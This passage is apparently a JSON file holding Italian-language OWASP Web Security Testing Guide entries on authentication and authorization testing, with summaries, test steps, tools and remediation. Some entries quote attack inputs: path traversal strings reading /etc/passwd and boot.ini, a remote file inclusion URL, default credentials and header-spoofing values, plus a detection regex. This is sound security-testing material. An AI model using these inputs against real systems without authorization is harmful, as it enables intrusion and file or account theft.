      "summary": "<h3>Sommario</h3><p>Gli username sono spesso strutturati in modo prevedibile (es: nome.cognome, iniziale+cognome, indirizzo email), rendendo facile indovinare account validi. Questo facilita attacchi di enumerazione e brute force.</p><h3>Obiettivi del test</h3><ul><li>Verificare se la struttura degli username rende vulnerabile l’applicazione a username enumeration.</li><li>Valutare se i messaggi di errore o le risposte permettono di distinguere username validi da non validi.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Analizza la struttura degli username disponibili (es: tramite fonti pubbliche, pattern ricorrenti nei dati osservati, documentazione, ecc.).</li><li>Testa le risposte dell’applicazione con username validi e invalidi, osservando eventuali differenze.</li><li>Utilizza dizionari e wordlist per tentare l’enumerazione di account validi, analizzando le risposte per differenze anche minime.</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><ul><li>Fornire sempre messaggi di errore generici e uniformi a tutti i tentativi di autenticazione falliti, indipendentemente dalla validità dello username o della password.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-ATHN-01": {
      "summary": "",
      "how-to": "",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHN-02": {
      "summary": "<h3>Sommario</h3><p>Molte applicazioni web e dispositivi hardware utilizzano password di default per gli account amministrativi integrati. Queste password possono essere statiche o prevedibili, facilmente ottenibili o indovinabili da un attaccante. Anche la creazione di nuovi utenti potrebbe avvenire con password predefinite o deboli, sia generate dall’applicazione sia impostate manualmente dallo staff.</p><h3>Obiettivi del test</h3><ul><li>Verificare la presenza di account con password di default o facilmente indovinabili.</li><li>Analizzare se la creazione di nuovi account prevede password prevedibili o deboli.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Identifica il software o il device in uso e cerca le relative credenziali di default (documentazione, manuali, motori di ricerca, database pubblici come CIRT.net, SecLists Default Passwords, DefaultCreds-cheat-sheet, sticker su device fisici).</li><li>Testa login comuni: admin/admin, root/root, password/password, admin/(vuoto), ecc.</li><li>Nel caso di nuove utenze, verifica la prevedibilità della password, sia dal punto di vista black-box che (se possibile) con analisi white-box del codice.</li><li>Per password generate automaticamente dall’applicazione, crea più account in tempi ravvicinati per capire se esistono pattern prevedibili (timestamp, hash deboli, sequenze, ecc.).</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>Burp Intruder</li><li>THC Hydra</li><li>Nikto 2</li><li>Nuclei (template Default Login)</li></ul><h3>Riferimenti</h3><ul><li>CIRT</li><li>SecLists Default Passwords</li><li>DefaultCreds-cheat-sheet</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHN-03": {
      "summary": "<h3>Sommario</h3><p>I meccanismi di account lockout mitigano gli attacchi di brute force bloccando l’account dopo un certo numero di tentativi falliti (tipicamente 3-5), con sblocco tramite attesa, self-service o intervento di un amministratore. Devono bilanciare la sicurezza contro i tentativi di blocco deliberato (DoS su utenti legittimi).</p><h3>Obiettivi del test</h3><ul><li>Valutare la capacità del lockout di mitigare attacchi di brute force.</li><li>Valutare la sicurezza del meccanismo di sblocco account.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Con un account di test, esegui tentativi di login falliti ripetuti e verifica se e come scatta il blocco. Testa il comportamento sia temporale che quantitativo (alcuni sistemi aumentano il lockout progressivamente).</li><li>Valuta la presenza di CAPTCHA o altri deterrenti.</li><li>Analizza la procedura di sblocco: link di reset, domande di sicurezza, e verifica che non sia facilmente aggirabile.</li><li>Nota: Non testare su account unici essenziali per il test per evitare lockout accidentali.</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><ul><li>Implementare meccanismi di lockout progressivi, con reset sicuri e non bypassabili.</li><li>Bilanciare il rischio di brute force con quello di denial-of-service su utenti legittimi.</li></ul><h3>Riferimenti</h3><ul><li>OWASP Brute Force Attacks</li></ul>",
      "test_objectives": ""
    },
    "WSTG-ATHN-04": {
      "summary": "<h3>Sommario</h3><p>L’autenticazione è il processo di verifica dell’identità digitale. Testare lo schema di autenticazione significa comprendere il funzionamento del sistema e provare a eluderlo (es. accedendo direttamente a risorse interne, modificando parametri, prevedendo o forzando sessioni, SQLi). Gli errori possono avvenire in fase di design, sviluppo o deployment.</p><h3>Obiettivi del test</h3><ul><li>Verificare che tutte le risorse che lo richiedono siano protette da autenticazione robusta.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Forza la navigazione diretta a risorse interne, senza autenticazione (forced browsing).</li><li>Prova la modifica di parametri di autenticazione nell’URL, nei form o nei cookie (es: authenticated=yes).</li><li>Analizza la prevedibilità dei session ID (pattern, sequenzialità, entropia debole).</li><li>Verifica la possibilità di bypass con SQL Injection su campi di login.</li><li>Se hai accesso al codice o exploit noti (es. PHPBB 2.0.12 bypass con unserialize), prova ad aggirare i controlli.</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>WebGoat</li><li>ZAP Proxy</li></ul><h3>Riferimenti</h3><ul><li>Niels Teusink: phpBB 2.0.12 authentication bypass</li><li>David Endler: Session ID Brute Force Exploitation and Prediction</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHN-05": {
      "summary": "<h3>Sommario</h3><p>Molte applicazioni offrono funzionalità di “remember me” o integrano password manager per facilitare l’uso delle credenziali. Tuttavia, questo amplia la superficie di attacco: credenziali potrebbero essere salvate nel browser o in client-side storage, esponendo a rischio furto tramite XSS, ClickJacking, CSRF o furto di token con lifetime troppo lungo.</p><h3>Obiettivi del test</h3><ul><li>Verificare che le sessioni e le credenziali non siano memorizzate o gestite in modo insicuro lato client.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Verifica se token, credenziali o session ID vengono salvati in chiaro (o base64, encoded) in localStorage, sessionStorage, cookie non protetti, IndexedDB, ecc.</li><li>Analizza la possibilità di furto credenziali tramite XSS, ClickJacking o CSRF.</li><li>Valuta la durata dei token/sessioni (“remember me” infinito è un rischio!).</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><ul><li>Gestire sessioni e credenziali solo lato server.</li><li>Mai salvare credenziali in chiaro o anche solo encode/criptate lato client.</li><li>Seguire le best practice di session management e password storage.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-ATHN-06": {
      "summary": "<h3>Sommario</h3><p>Il tester verifica che l’applicazione istruisca correttamente il browser a non memorizzare dati sensibili (cache, cronologia). La mancata protezione espone dati come indirizzi, carte di credito o sessioni ad accesso non autorizzato tramite cache/cronologia anche dopo logout.</p><h3>Obiettivi del test</h3><ul><li>Verificare che l’applicazione non salvi informazioni sensibili lato client.</li><li>Verificare che non sia possibile accedere a dati sensibili senza autenticazione tramite cache o cronologia.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Effettua login e logout, poi usa il tasto “indietro” del browser: i dati devono essere inaccessibili (logout robusto, pagine non in cache).</li><li>Analizza gli header HTTP delle risposte: devono essere presenti <code>Cache-Control: no-cache, no-store</code>, <code>Pragma: no-cache</code>, <code>Expires: 0</code>.</li><li>Verifica che i dati sensibili non siano presenti nei file di cache delle directory locali dei browser.</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>ZAP Proxy</li></ul><h3>Riferimenti</h3><ul><li>Caching in HTTP</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHN-07": {
      "summary": "<h3>Sommario</h3><p>Le password statiche sono ancora il meccanismo di autenticazione più diffuso, ma spesso sono deboli, riutilizzate e facilmente indovinabili. Molte applicazioni accettano password semplici come ‘123456’, ‘password’, ‘qwerty’, oppure alternative ancor meno sicure come data di nascita, codice fiscale, PIN. Un’autenticazione debole espone l’applicazione ad attacchi di brute force.</p><h3>Obiettivi del test</h3><ul><li>Valutare la robustezza della policy password (lunghezza, complessità, riuso, aging).</li><li>Valutare la resistenza contro tentativi automatizzati di password guessing.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Analizza la policy password applicata, se pubblica (documentazione, form di registrazione, errori).</li><li>Prova password deboli, comuni, sequenze, pattern di riutilizzo.</li><li>Verifica se la policy prevede (e fa rispettare) lunghezza minima, complessità, cambio periodico.</li><li>Nota: NIST e NCSC sconsigliano il cambio password obbligatorio, ma alcuni standard (es. PCI DSS) lo richiedono ancora.</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><ul><li>Implementare policy di password robuste (lunghezza, complessità, no riuso, aging ragionato).</li><li>Valutare l’adozione di autenticazione forte/multifattore (MFA/2FA).</li></ul><h3>Riferimenti</h3><ul><li>OWASP: Brute Force Attacks</li></ul>",
      "test_objectives": ""
    },
    "WSTG-ATHN-08": {
      "summary": "<h3>Riepilogo</h3><p>Spesso chiamate 'domande segrete', le security questions e relative risposte vengono comunemente utilizzate per il recupero della password dimenticata (vedi anche il test sulle funzionalità deboli di cambio/reset password), o come ulteriore livello di sicurezza rispetto alla sola password.</p><p>Tipicamente, vengono impostate alla creazione dell’account e richiedono all’utente di scegliere da un set di domande predefinite e fornire una risposta, oppure di crearne di proprie. Entrambi gli approcci presentano vulnerabilità. Idealmente, le security questions dovrebbero produrre risposte conosciute **solo** dall’utente e non intuibili né individuabili da terzi. In realtà, questo obiettivo è molto più difficile di quanto sembri.</p><p>La sicurezza delle domande risiede proprio nella segretezza della risposta. Tuttavia, anche se molte risposte non sono pubblicamente note, la maggior parte delle domande adottate dai siti web portano a risposte che sono solo apparentemente private.</p><p>Le domande predefinite sono spesso banali e portano a risposte deboli, ad esempio:<ul><li>Risposte note a familiari o amici (es: 'Qual è il cognome da nubile di tua madre?', 'Qual è la tua data di nascita?')</li><li>Risposte facilmente indovinabili (es: 'Qual è il tuo colore preferito?', 'Qual è la tua squadra di baseball preferita?')</li><li>Risposte brute-forzabili (es: 'Qual è il nome del tuo insegnante di liceo preferito?'), spesso presenti in liste di nomi comuni e quindi attaccabili tramite brute force automatizzato.</li><li>Risposte pubblicamente rintracciabili (es: 'Qual è il tuo film preferito?'), ottenibili da profili social.</li></ul></p><p>Permettere all’utente di creare la propria domanda può portare a domande inutili o a bypass totali della security question, es:<ul><li>'Quanto fa 1+1?'</li><li>'Qual è il tuo username?'</li><li>'La mia password è S3curIty!'</li></ul></p><h3>Obiettivi del test</h3><ul><li>Valutare la complessità e la prevedibilità delle domande</li><li>Analizzare le possibili risposte e la brute-forzabilità</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Cerca di ottenere la lista delle security questions creando un nuovo account o avviando il flusso 'Ho dimenticato la password'. Prova a generare quante più domande possibile per capire il livello di sicurezza del set proposto. Se ricadono nelle tipologie sopra descritte, sono vulnerabili a tentativi di guessing, brute force o recupero tramite OSINT/social engineering.</p><p>Verifica se è possibile creare domande personalizzate, sia in fase di registrazione sia nelle impostazioni di recupero password. Se sì, il sistema è vulnerabile alla creazione di domande insicure.</p><p>Verifica la presenza di lockout se vengono inserite risposte sbagliate ripetutamente (vedi anche il test su Weak lock out mechanism).</p><p>In fase di exploitation considera:<ul><li>Quante domande vanno superate? In molte applicazioni basta una sola risposta corretta.</li><li>Le risposte sono facilmente reperibili online, con Google o social engineering?</li><li>Il reset password permette tentativi illimitati? C’è blocco dopo X risposte errate? (Un lockout può essere anche un vettore DoS per un attaccante)</li><li>Quali domande hanno risposte pubbliche, fattuali o con pochi valori possibili (es: marca della prima auto)? Queste sono più facili da sfruttare.</li></ul></p><p>Il principio base per l’exploit è puntare su domande con maggior probabilità di risposta esatta, aumentando le chance statistiche di guessing.</p><h3>Riferimenti</h3><ul><li>The Curse of the Secret Question</li><li>OWASP Security Questions Cheat Sheet</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHN-09": {
      "summary": "<h3>Riepilogo</h3><p>Per qualsiasi applicazione che richieda autenticazione con password, deve esistere un meccanismo di recupero account nel caso la password venga dimenticata. A volte il processo può essere manuale (es. contattare il supporto), ma spesso è previsto un self-service di password reset tramite conferma dell’identità con altri metodi.</p><p>Questa funzionalità rappresenta una via diretta per compromettere l’account dell’utente, quindi è essenziale che sia sicura.</p><h3>Obiettivi del test</h3><ul><li>Verificare se le funzionalità di cambio/reset password permettono il compromesso degli account.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Prima di tutto, raccogli tutte le informazioni sui meccanismi di reset password disponibili (web, mobile, API, ecc.), in modo da testare eventuali differenze tra le varie interfacce.</p><p>Verifica quali informazioni sono necessarie per avviare il reset (username, email, ID interno, ecc.), valutando la reperibilità di questi dati da fonti pubbliche.</p><p>Punti critici da controllare:<ul><li>Il processo di reset è più debole dell’autenticazione normale? Spesso il reset può bypassare meccanismi di MFA, riducendo la sicurezza complessiva.</li><li>Sono presenti rate limiting e protezioni contro attacchi automatizzati? Es. CAPTCHA, blocco dopo tentativi errati, limiti sull’invio di email/SMS.</li><li>La funzionalità è vulnerabile ad attacchi noti (es. SQL injection, XSS)?</li><li>Il processo permette l’enumerazione degli utenti? (vedi anche il relativo test)</li></ul></p><p>Attenzione ai modelli di reset via email:</p><ul><li>Invio della password in chiaro via email (inaccettabile!)</li><li>Invio di una nuova password generata, che obbliga l’utente a cambiarla al primo accesso.</li><li>La password deve essere generata con CSPRNG, sufficientemente lunga e preferibilmente come passphrase.</li><li>Il dominio che invia le email dovrebbe avere SPF, DKIM e DMARC configurati.</li><li>Considera se l’email sia un canale sufficientemente sicuro (MFA attivo? Caselle condivise?)</li></ul><p>Reset via link/token:</p><ul><li>Il link è via HTTPS? Altrimenti il token può essere intercettato.</li><li>Il token può essere usato più volte? Deve scadere dopo il primo uso.</li><li>Il token scade se non usato entro un tempo breve (massimo 1 ora)?</li><li>Token generati con CSPRNG, almeno 128 bit (32 hex char), mai MD5/email, mai GUID deboli.</li><li>Il link include userID modificabile? Se sì, può essere usato per resettare la password di altri utenti.</li><li>È possibile manipolare l’header Host per rubare token? (vedi anche il relativo test Host Header Injection)</li><li>Il token può essere esposto a terzi via header Referer, script di terze parti, analytics ecc.? Usare il Referrer-Policy HTTP header.</li></ul><p>Reset tramite SMS/chiamata automatica:</p><ul><li>I token sono più corti (spesso 6 cifre = ~20 bit), quindi la brute force è più fattibile. Serve una forte protezione anti-brute force e rate limiting.</li><li>I token devono scadere dopo breve tempo e essere monouso.</li><li>Considera la sicurezza di SMS/voce: possono essere intercettati, usati per DoS, e comportano costi per l’operatore.</li></ul><p>L’uso di security questions come unica verifica è considerato debole e va evitato ove possibile.</p><p>Se l’applicazione consente di modificare l’identificativo principale dell’account (email/telefono), il reset password dovrebbe richiedere una nuova autenticazione. Tutte le operazioni che impattano sulla sicurezza dell’account (email, MFA, impostazioni di backup) devono prevedere una re-authentication.</p><p>Altre verifiche chiave:</p><ul><li>Quando si imposta una nuova password, è possibile specificare arbitrary userID? Se sì, si possono cambiare le password di altri.</li><li>L’utente deve autenticarsi nuovamente per cambiare password? Se sì, la sicurezza è maggiore.</li><li>Il form di cambio password è vulnerabile a CSRF?</li><li>La password policy è coerente su tutte le funzioni (registrazione, cambio, reset)?</li></ul><h3>Riferimenti</h3><ul><li>OWASP Forgot Password Cheat Sheet</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHN-10": {
      "summary": "<h3>Riepilogo</h3><p>Anche se i meccanismi di autenticazione primari non presentano vulnerabilità, potrebbero esserci problemi nei canali di autenticazione alternativi per gli stessi account utente. È importante identificare tutti i canali alternativi e, se rientrano nello scope, testarli alla ricerca di vulnerabilità.</p><p>Questi canali potrebbero permettere il bypass della protezione principale o l’esposizione di informazioni utili per attaccare il canale principale. Alcuni esempi: siti web mobile, siti ottimizzati per accessibilità, versioni di test/staging, partner site che condividono account, app mobile, desktop app, call center, sistemi IVR.</p><p>Il focus di questo test è sui canali alternativi (non su contenuti differenti serviti dallo stesso sito tramite progressive enrichment/degradation, assenza di cookie/JS/plugin, ecc.) Anche se il test non copre questi canali, la loro esistenza deve essere documentata perché possono abbassare il livello di sicurezza globale.</p><h3>Esempio</h3><p>Sito principale usa TLS per autenticazione, ma la versione mobile no e ha un meccanismo di password recovery più debole.</p><h3>Obiettivi del test</h3><ul><li>Identificare i canali di autenticazione alternativi</li><li>Valutare le misure di sicurezza e verificare possibili bypass sui canali alternativi</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Testa a fondo il canale di autenticazione principale per capire come vengono gestiti account, privilegi e recovery. Poi individua altri canali tramite:</p><ul><li>Lettura di contenuti del sito (homepage, contatti, FAQ, robots.txt, sitemap.xml)</li><li>Analisi dei log proxy per keyword come 'mobile', 'android', 'auth', 'sso' ecc.</li><li>Ricerche su motori per altri siti della stessa organizzazione con funzionalità simili</li></ul><p>Per ciascun canale, verifica se gli account sono condivisi e se offrono le stesse (o altre) funzionalità. Mappa eventuali differenze, come funzioni amministrative disponibili solo su mobile o via call center, e verifica la gestione della sessione (cookie cross-channel, sessioni concorrenti).</p><p>I canali alternativi vanno sempre riportati nel report, anche se fuori dallo scope. Se autorizzato, esegui tutti i test di autenticazione anche sui canali alternativi e confrontali col canale principale.</p><h3>Test case correlati</h3><p>Utilizzare tutti i test previsti per l'autenticazione.</p>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>Assicurarsi che su tutti i canali sia applicata una policy di autenticazione coerente, garantendo uguale livello di sicurezza.</p>",
      "test_objectives": ""
    },
    "WSTG-ATHN-11": {
      "summary": "<h3>Riepilogo</h3><p>Molte applicazioni implementano Multi-Factor Authentication (MFA) come ulteriore livello di sicurezza per la login. È chiamata anche Two-Factor Authentication (2FA) o Two-Step Verification (2SV), anche se i termini non sono perfettamente equivalenti. MFA significa richiedere almeno due fattori di autenticazione diversi all’utente.</p><p>L’implementazione di MFA aumenta la complessità sia della login che della gestione delle credenziali, recovery, ecc., e deve essere implementata in modo robusto e corretto.</p><h3>Obiettivi del test</h3><ul><li>Identificare la tipologia di MFA utilizzata</li><li>Valutare la robustezza e sicurezza dell’implementazione MFA</li><li>Provare a bypassare la MFA</li></ul>",
      "how-to": "<h3>Come testare</h3><p>MFA richiede almeno due dei seguenti fattori:<ul><li>Qualcosa che sai (es: password, PIN)</li><li>Qualcosa che possiedi (es: token hardware, telefono, smartcard, email – quest’ultima considerata debole se non protetta anch’essa da MFA)</li><li>Qualcosa che sei (es: biometria)</li></ul>Email da sola non è considerata un secondo fattore forte. Usare due fattori dello stesso tipo (password + PIN) **non** è MFA, ma può essere una 2SV.</p><p>La biometria su web app è ancora poco diffusa, ma standard come WebAuthn stanno iniziando a essere adottati.</p><p>Per il test MFA:<ul><li>Identifica tutte le funzionalità di autenticazione (login principale, funzioni critiche, provider federati, API, canali alternativi)</li><li>Verifica che MFA sia applicata in modo coerente ovunque. Canali che non la richiedono rappresentano bypass.</li><li>Verifica se è possibile saltare step MFA (es: login multi-step, accesso diretto a API dopo solo username+password)</li><li>In presenza di provider OIDC (es: Azure B2C), verifica i flow disponibili e se alcuni non prevedono MFA.</li><li>Testa eventuali bypass intenzionali: whitelist di IP, header custom (X-Debug), account hardcoded (es: root/breakglass)</li><li>Verifica possibili problemi nella gestione separata tra login federata e locale</li><li>Se MFA è implementata su reverse proxy e non sull’app backend, può essere aggirata collegandosi direttamente al backend</li><li>Testa la gestione MFA lato utente: serve re-authentication per modificare/rimuovere MFA? È vulnerabile a CSRF? È possibile modificare la MFA di altri utenti via IDOR?</li><li>Verifica la robustezza dei codici di backup: unici, sicuri, monouso, brute-force protection, notifiche su uso.</li><li>Testa eventuale flusso di reset MFA: deve essere almeno robusto quanto la MFA stessa.</li><li>L’uso di security questions come bypass MFA è un rischio da evidenziare.</li></ul></p><p>Analizza la tipologia di OTP (6 cifre via app, SMS, email ecc.), verifica:<ul><li>Account lockout dopo più tentativi errati</li><li>IP block dopo tentativi su account diversi</li><li>Logging dei tentativi falliti</li><li>Vulnerabilità a injection</li><li>Robustezza (lunghezza, validità, unicità, possibilità di riutilizzo, legame all’account giusto, brute force protection, rate limiting)</li></ul></p><p>Per HOTP/TOTP:<ul><li>Segreto condiviso sufficientemente lungo (almeno 160 bit, RFC 4226)</li><li>Generazione tramite funzione random sicura</li><li>Accettazione multipla di codici solo se necessario (drift di tempo), ma limitare il range per non aumentare la brute force</li></ul></p><p>Per OTP inviato (email, SMS, voce):<ul><li>Canale sufficientemente sicuro?</li><li>Codici lunghi, randomici e generati in modo sicuro</li><li>Validità temporale limitata</li><li>Monouso, rate limiting sull’invio per prevenire spam/DoS/costi eccessivi</li></ul></p><p>Push notification:<ul><li>La notifica mostra contesto (IP, location...)?</li><li>Prevede meccanismi di challenge (number matching)?</li><li>Protezione contro spam di notifiche?</li></ul></p><p>Fattore 'location':<ul><li>Accesso limitato a IP specifici può essere bypassato con X-Forwarded-For se non gestito correttamente</li><li>Verificare anche la gestione di IPv6</li><li>Controllare che IP trusted non includano reti pubbliche o guest</li></ul></p><p>TLS client certificate:<ul><li>Verificare restrizione sulle Certificate Authority accettate</li><li>Verificare che un certificato valido sia utilizzabile solo dal relativo utente</li><li>Controllare scadenza e revoca</li></ul><h3>Test case correlati</h3><ul><li>Testing for Weak Lock Out Mechanism</li><li>Testing for Weak Password Change or Reset Functionalities</li></ul>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>Assicurarsi che:</p><ul><li>MFA sia implementata su tutti gli account e funzionalità rilevanti</li><li>I metodi di MFA siano adeguati al contesto</li><li>Le implementazioni siano protette da brute force</li><li>Siano previsti audit e logging per tutte le attività MFA</li></ul><p>Vedi anche OWASP Multi-Factor Authentication Cheat Sheet per raccomandazioni aggiuntive.</p><h3>Riferimenti</h3><ul><li>OWASP Multi-Factor Authentication Cheat Sheet</li></ul>",
      "test_objectives": ""
    },
    "WSTG-ATHZ-01": {
      "summary": "<h3>Riepilogo</h3><p>Molte applicazioni web utilizzano e gestiscono file come parte delle operazioni quotidiane. Se i metodi di validazione dell’input non sono ben progettati o implementati, un attaccante può sfruttare il sistema per leggere o scrivere file che non dovrebbero essere accessibili. In determinate situazioni, potrebbe persino essere possibile eseguire codice arbitrario o comandi di sistema.</p><p>Tradizionalmente, i web server e le applicazioni implementano meccanismi di autenticazione per controllare l’accesso a file e risorse. I web server cercano di confinare i file degli utenti all’interno di una “root directory” o “web document root”, che rappresenta una directory fisica sul filesystem. Gli utenti dovrebbero considerare questa directory come base per la struttura gerarchica dell’applicazione.</p><p>La definizione dei privilegi avviene tramite Access Control Lists (ACL), che specificano quali utenti o gruppi possono accedere, modificare o eseguire un determinato file sul server. Questi meccanismi sono progettati per impedire ad utenti malevoli di accedere a file sensibili (ad esempio /etc/passwd su piattaforme UNIX-like) o eseguire comandi di sistema.</p><p>Molte applicazioni web utilizzano script lato server per includere diversi tipi di file. È piuttosto comune utilizzare questo metodo per gestire immagini, template, caricare testi statici, ecc. Sfortunatamente, queste applicazioni possono esporre vulnerabilità di sicurezza se i parametri di input (es: parametri di form, cookie) non sono validati correttamente.</p><p>In web server e applicazioni web, questo tipo di problema si manifesta nelle vulnerabilità di path traversal/file include. Sfruttando questo tipo di vulnerabilità, un attaccante può leggere directory o file ai quali normalmente non potrebbe accedere, ottenere dati al di fuori della web document root o includere script e altri file da siti esterni.</p><p>Nell’ambito dell’OWASP Testing Guide, saranno considerate solo le minacce legate alle web application, e non quelle ai web server (come ad esempio l’infame codice di escape %5c in Microsoft IIS). Ulteriori approfondimenti saranno forniti nella sezione riferimenti.</p><p>Questo tipo di attacco è anche noto come attacco dot-dot-slash (../), directory traversal, directory climbing o backtracking.</p><p>Durante un assessment, per individuare vulnerabilità di path traversal e file include, il tester deve eseguire due fasi differenti:</p><h3>Obiettivi del test</h3><ul><li>Individuare i punti di iniezione relativi a path traversal</li><li>Valutare tecniche di bypass e identificare l’estensione della traversal</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Per determinare quali parti dell’applicazione sono vulnerabili a bypass della validazione dell’input, il tester deve enumerare tutte le parti dell’applicazione che accettano contenuti dall’utente. Questo include anche richieste HTTP GET e POST e opzioni comuni come file upload e form HTML.</p><p>Esempi di controlli da eseguire in questa fase:</p><ul><li>Ci sono parametri di richiesta che potrebbero essere usati per operazioni sui file?</li><li>Ci sono estensioni di file insolite?</li><li>Ci sono nomi di variabili interessanti? Esempi:<br>https://example.com/getUserProfile.jsp?item=ikki.html<br>https://example.com/index.php?file=content<br>https://example.com/main.cgi?home=index.htm</li><li>È possibile identificare cookie usati dall’applicazione per la generazione dinamica di pagine o template? Esempi:<br>Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower<br>Cookie: USER=1826cc8f:PSTYLE=GreenDotRed</li></ul><p>La fase successiva consiste nell’analizzare le funzioni di validazione degli input presenti nell’applicazione web. Usando l’esempio sopra, la pagina dinamica getUserProfile.jsp carica informazioni statiche da un file e mostra il contenuto all’utente. Un attaccante potrebbe inserire la stringa malevola ../../../../etc/passwd per includere il file delle password di un sistema Linux/UNIX, ovviamente solo se la validazione fallisce e l’applicazione web ha i privilegi per leggere il file.</p><pre><code>https://example.com/getUserProfile.jsp?item=../../../../etc/passwd</code></pre><p>Un altro esempio è l’inclusione di contenuti da una fonte esterna:</p><pre><code>https://example.com/index.php?file=https://www.owasp.org/malicioustxt</code></pre><p>Lo stesso vale per cookie o altri vettori di input utilizzati per la generazione dinamica di pagine.</p><p>Altri payload per file inclusion sono disponibili su PayloadsAllTheThings - File Inclusion</p><p>Nota: i sistemi operativi utilizzano separatori di percorso diversi.<br>- Unix-like OS: root directory: / — directory separator: /<br>- Windows OS: root directory: <drive letter>: — directory separator: \\ oppure /<br>- Classico macOS: root directory: <drive letter>: — directory separator: :</p><p>È un errore comune degli sviluppatori non aspettarsi tutte le forme di encoding e quindi validare solo contenuti base. Se la stringa di test non ha successo al primo tentativo, prova un altro schema di encoding.</p><p>Trovi tecniche di encoding e payload già pronti su PayloadsAllTheThings - Directory Traversal</p><p>Windows shell: l’aggiunta di alcuni caratteri (es: <, >, virgolette, ./, ecc.) spesso non influenza la funzione del percorso.</p><p>Windows UNC Filepaths: percorsi SMB possono essere usati per referenziare file su share remoti, con possibilità di ottenere hash di autenticazione.</p><p>Windows NT Device Namespace: riferimenti come \\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\ permettono accesso a device o volumi.</p><p>Se disponi del codice sorgente (gray-box), cerca pattern ricorrenti come include(), fopen(), readfile(), require() in PHP o funzioni analoghe in altri linguaggi.</p><pre><code>(include|require)(_once)?\\s*['\"(]?\\s*\\$_(GET|POST|COOKIE)</code></pre><p>Alcune applicazioni generano pagine dinamiche usando valori memorizzati in database: verifica se è possibile inserire stringhe di traversal nei dati inseriti.</p><p>Analizza anche funzioni che “normalizzano” input malevoli — spesso sono implementate male e introducono vulnerabilità.</p><pre><code>file=....//....//boot.ini\nfile=....\\\\....\\\\boot.ini\nfile=..\\..\\boot.ini</code></pre>",
      "tools": "<h3>Strumenti</h3><ul><li>DotDotPwn - Directory Traversal Fuzzer</li><li>PayloadsAllTheThings - File Inclusion/Directory Traversal</li><li>Burp Suite, ZAP, DirBuster</li><li>grep, strumenti di encoding/decoding</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-ATHZ-02": {
      "summary": "<h3>Riepilogo</h3><p>Questo tipo di test si focalizza sulla verifica di come lo schema di autorizzazione sia stato implementato per ciascun ruolo o privilegio nell’accesso a funzioni e risorse riservate.</p><p>Per ogni ruolo specifico durante l’assessment, e per ogni funzione e richiesta che l’applicazione esegue dopo l’autenticazione, è necessario verificare:</p><ul><li>È possibile accedere a quella risorsa anche se l’utente non è autenticato?</li><li>È possibile accedervi dopo il logout?</li><li>È possibile accedere a funzioni e risorse che dovrebbero essere accessibili solo a utenti con ruolo/privilegio differente?</li></ul><p>Prova ad accedere come utente amministratore e traccia tutte le funzioni amministrative.</p><ul><li>È possibile accedere alle funzioni admin come utente non admin?</li><li>È possibile usare funzioni amministrative come utente con altro ruolo, a cui l’azione dovrebbe essere negata?</li></ul><h3>Obiettivi del test</h3><ul><li>Valutare se è possibile ottenere accesso orizzontale o verticale non autorizzato</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Accedi alle risorse e prova operazioni sia in orizzontale (tra utenti dello stesso ruolo) che in verticale (tra utenti di ruolo diverso)</li></ul><p>Per ogni funzione, ruolo o richiesta:</p><ul><li>È possibile accedere a risorse di altri utenti con lo stesso ruolo?</li><li>È possibile eseguire funzioni su risorse di altri utenti?</li></ul><p>Esempio:<br>Se la funzione viewSettings è accessibile da ogni utente (URL tipo /account/viewSettings), prova ad inviare una richiesta con l’username di un altro utente. Se ricevi dati di altri utenti, la vulnerabilità è presente (lateral movement).</p><p>Stessa cosa per funzioni admin (es: /admin/addUser): cosa succede se la richieste viene inviata da un utente normale?</p><p>Alcune applicazioni usano header non standard come X-Original-URL o X-Rewrite-URL per bypassare controlli basati solo sul path.</p><p>Testa anche header come X-Forwarded-For, X-Client-IP, etc. e valori come 127.0.0.1 o indirizzi privati per tentare di simulare accessi interni.</p><p>Documenta sempre tentativi riusciti di bypass dei controlli.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>OWASP ZAP (addon Access Control Testing)</li><li>Burp Suite (estensioni AuthMatrix, Autorize)</li></ul>",
      "remediation": "<h3>Remediation</h3><p>Applicare il principio del privilegio minimo su utenti, ruoli e risorse per prevenire accessi non autorizzati.</p>",
      "test_objectives": ""
    },
    "WSTG-ATHZ-03": {
